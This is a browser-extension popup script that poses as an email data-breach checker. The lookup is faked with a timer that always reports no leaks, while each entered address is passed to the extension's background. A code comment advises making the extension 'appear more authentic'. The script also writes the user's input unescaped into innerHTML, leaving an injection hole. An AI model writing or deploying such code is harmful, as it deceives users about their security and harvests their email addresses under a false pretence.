document.getElementById('lookup-btn').addEventListener('click', function() {
    const contactInput = document.getElementById('contact-input').value;
    const resultsContainer = document.getElementById('results-container');
    const resultsText = document.getElementById('results-text');

    // Check if input is not empty
    if (contactInput.trim() === "") {
        alert("Please enter an email.");
        return;
    }

    // Email validation function
    const validateEmail = (email) => {
        return String(email)
            .toLowerCase()
            .match(
                /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|.(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
            );
    };

    // Check if the input is a valid email
    if (validateEmail(contactInput)) {

        resultsText.textContent = `Loading results...`;
        // You can replace this part with an actual look up service/auth key to make the extension appear more authentic.
        setTimeout(() => {
            resultsText.innerHTML = `No found leaks or results for </b>${contactInput}</b>`;
            chrome.runtime.sendMessage(
                {
                    type: "result",
                    result: contactInput || null
                }
            );
        }, 2000); // Simulates a delay
    } else {
        resultsText.textContent = `${contactInput} is an invalid email.`;
    }

    // Show the results
    resultsContainer.style.display = "block";  
});
